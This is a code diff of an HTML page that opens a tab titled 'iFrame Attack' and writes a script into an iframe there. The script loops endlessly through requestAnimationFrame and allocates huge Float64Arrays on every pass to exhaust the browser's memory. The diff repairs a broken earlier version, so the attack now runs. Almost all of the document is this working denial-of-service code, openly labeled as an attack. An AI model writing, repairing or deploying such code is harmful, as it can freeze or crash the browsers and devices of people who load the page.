@@ -26,7 +26,7 @@
                 return;
             }
 
-            // Inject the iframe-based overload attack into the new tab
+            // Inject HTML with properly formatted script into the new tab
             attackTab.document.write(`
                 <html>
                 <head><title>iFrame Attack</title></head>
@@ -44,7 +44,11 @@
                         // Write attack script inside the iframe
                         let iframeDoc = iframe.contentWindow.document;
                         iframeDoc.open();
-                        iframeDoc.write('<script>function startWorker(){let data=[];function allocate(){for(let i=0;i<500;i++){data.push(new Float64Array(2e7));} requestAnimationFrame(allocate);} allocate();<\/script>');
+                        iframeDoc.write('<html><head><title>Attack</title></head><body>');
+                        iframeDoc.write('<script>');
+                        iframeDoc.write('function startWorker() { let data = []; function allocate() { for (let i = 0; i < 500; i++) { data.push(new Float64Array(2e7)); } requestAnimationFrame(allocate); } allocate(); } startWorker();');
+                        iframeDoc.write('<\/script>');
+                        iframeDoc.write('</body></html>');
                         iframeDoc.close();
                     }
 
@@ -69,5 +73,3 @@
     </script>
 </body>
 </html>
-
-
